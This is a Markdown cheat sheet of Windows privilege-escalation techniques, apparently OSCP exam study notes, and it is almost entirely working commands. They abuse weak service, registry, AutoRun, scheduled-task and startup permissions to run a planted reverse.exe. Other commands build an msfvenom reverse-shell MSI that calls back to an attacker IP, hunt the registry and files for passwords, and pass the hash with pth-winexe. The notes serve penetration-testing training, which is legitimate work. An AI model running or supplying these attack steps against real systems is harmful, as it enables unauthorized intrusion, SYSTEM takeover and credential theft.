# Checklist
- [ ] Run systeminfo
- [ ] Check what's on C:\ and check all the directories that are not default
- [ ] Get-History, PSReadLine
  - Get-History
  - (Get-PSReadlineOption).HistorySavePath
    - type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    - type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
- [ ] juicy files
  - Get-ChildItem -Path C:\ -Include *.kdbx,*.htpasswd -File -Recurse -ErrorAction SilentlyContinue
  - Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
  - Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig,*.config -File -Recurse -ErrorAction SilentlyContinue
- [ ] User's Desktop,Downloads,Documents
- [ ] Kernal Exploit - check windows version
- [ ] Vulnerable Software: C:\Program Files
- [ ] User Privileges: whoami /priv(https://lolbas-project.github.io/#)
- [ ] Scheduled Tasks
- [ ] Check for .kdbx from current user's directory
- [ ] [Service Exploits](#Service_Exploits)


# Service Exploits
## Service Commands
```bash
# Query the configuration of the service
sc.exe qc <name>

# Query the current status of the service
sc.exe query <name>

# Modify configuration option of a service
sc.exe config <name> <option>= <value>

# start/stop a service
net start/stop <name>
```

## Service Exploits - Insecure Service Permissions
![image](https://github.com/nuricheun/OSCP/assets/14031269/309ec49b-84b7-430e-845c-d33789b3eb43)
![image](https://github.com/nuricheun/OSCP/assets/14031269/da59ac17-94f6-4dc5-b681-5b0878363da7)

```bash
# confirm user's permissions over daclsvc with accesschk.exe
accesschk.exe /accepteula -uwcqv user daclsvc

# as we can see we can change service configuration(SERVICE_CHANGE_CONFIG)
# let's check the service configuration
sc qc daclsvc

# let's change the service's binary path :)
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""

# Now start the service(we checked we can start/stop the service through accesschk.exe)
net start daclsvc
```

## Service Exploits - Unquoted Service Path
![image](https://github.com/nuricheun/OSCP/assets/14031269/0de4a0b4-ea5f-4b23-8baf-27ae1874329d)
![image](https://github.com/nuricheun/OSCP/assets/14031269/66a93954-be8e-4076-83ef-3bdf7d326560)

```bash
# let's check our permissions over unquotedsvc
accesschk.exe /accepteula -ucqv user unquotedsvc

# check unquoted service path with sc
sc qc unquotedsvc

# as we can see the binary path name isn't quoted
# let's use accesschk.exe to see if we can add our reverse shell in one of the paths
C:\Users\user>C:\Privesc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# let's copy our reverse shell and change the name as Common.exe
C:\Users\user>copy C:\Privesc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# Now start the service(we checked we can start/stop the service through accesschk.exe)
net start unquotedsvc
```

## Service Exploits - Weak Registry Permissions
![image](https://github.com/nuricheun/OSCP/assets/14031269/bb6aab10-82bb-4368-9866-31b9597ebd69)
![image](https://github.com/nuricheun/OSCP/assets/14031269/462f51eb-fb1e-4559-9d89-d8e2cf299431)

```bash
# On Winnpeas it says "check if you can modify the registry of a service"
# Verify the permission with powershell
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
# Or with accesschk.exe
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# NT AUTHORITY\INTERACTIVE is a pseudo group and has all users who can log on to the system
# before moving on let's check if we can start the service
accesschk.exe /accepteula -ucqv user regsvc

# Let's check current service registry entry
reg query HKLM\SYSTEM\currentControlSet\services\regsvc

# Overwrite the ImagePath registry key to point to the reverse.exe executable you created:(same as changing binpath of the service)
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# Let's start the service
net start regsvc
```


## Service Exploits - Insecure Service Executables(modifiable original service executable)
```bash
# Verify the access over executable with accesschk
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# Verify if we can start/stop the service with accesschk
accesschk.exe /accepteula -uvqc filepermsvc

# First backup the service executables
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

# Start the service
net start filepermsvc
```

## Service Exploits - DLL Hijacking
```bash
# Check if the user has start/stop service over the services
accesschk.exe /accepteula -uvqc user dllsvc

# Check the service configuration
sc qc dllsvc

# Run Procmon as admin
# Stop and clear the current capture(microscope icon/ one that's next next to it)
# Press ctl+l to set  the filter
# Proccess name -> dllhijackservice.exe

# 
```

# Registry
## Registry - AutoRuns(If you can modify/write to an AutoRun executable)
On Windows 10, This will run as the user who was logged on last
```bash
# Query the registry for AutoRun executables:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Using accesschk.exe, note that one of the AutoRun executables is writable by everyone
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# If we can modify it, we can overwrite the file
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

```

## Registry - AlwaysInstallElevated
```bash
# Query the registry for AlwaysInstallElevated keys: Both need to set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create a reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.212.194 LPORT=53 -f msi -o reverse.msi

# transfer the file to C:\Privesc
copy \\10.8.212.194\kali\reverse.msi C:\Privesc\reverse.msi

# Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

# Passwords
## Passwords-Registry
```bash
# The registry can be searched for keys and values that contain the word "password":
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# If you want to save some time, query this specific key to find admin AutoLogon credentials:
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

# Query putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 

# Use the winexe command to spawn a command prompt running with the admin privileges
winexe -U 'admin%password' //10.10.165.36 cmd.exe
# This will give you systemshell
winexe -U 'admin%password' --system //10.10.165.36 cmd.exe 

```

## Passwords - Saved Creds
```bash
# List any saved credentials:
cmdkey /list

# we can run as admin now
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

## Passwords - Configuration Files
```bash
# Recursively search for files in the current directory with "pass" in the name, or ending in ".config"
dir /s *pass* == *.config

# Recursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini, or .txt:
findstr /si password *.xml *.ini *.txt

# C:\Windows\Panther\Unattend.xml
-> the password is base64 encoded
```

## Passwords - Security Account Manager (SAM)
```bash
# The SAM and SYSTEM files are located in the C:\Windows\System32\config directory
# The files are locked while Windows is running
# Backups may exist in C:\Windows\Repair or C:\Windows\System32\config\RegBack directories

# Transfer the SAM and SYSTEM files to your Kali VM:

```

## Passwords - Passing the Hash
```bash
pth-winexe -U 'admin%hash:hash' //10.10.165.36 cmd.exe
pth-winexe --system -U 'admin%hash:hash' //10.10.165.36 cmd.exe

```

# Scheduled Tasks
```bash
# There's no easy method for enumerating custom tasks that belong to other users as a low privileged user account
schtasks /query 
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# When you find a file that looks like a scheduled task, run this to see if you can write to this file
accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# Let's write to this file to trigger reverse shell
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

# Insecure GUI Apps
![image](https://github.com/nuricheun/OSCP/assets/14031269/e4d2e8f2-dc4a-4b1e-ac4b-4b2e507d5f21)

```bash
# Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
tasklist /V | findstr mspaint.exe
# In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

```

# Startup Apps
```bash
# Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# use this script to create a shortcut in StartUp directory
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start 
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

```

# Installed Applications
```bash
# Manually enumerate all running programs
tasklist /v

# We can use Seatbelt to search for nonstandard processes
.\seatbelt.exe NonstandardProcesses

# we can use winpeas as well
 .\winPEASany.exe quiet processinfo
```
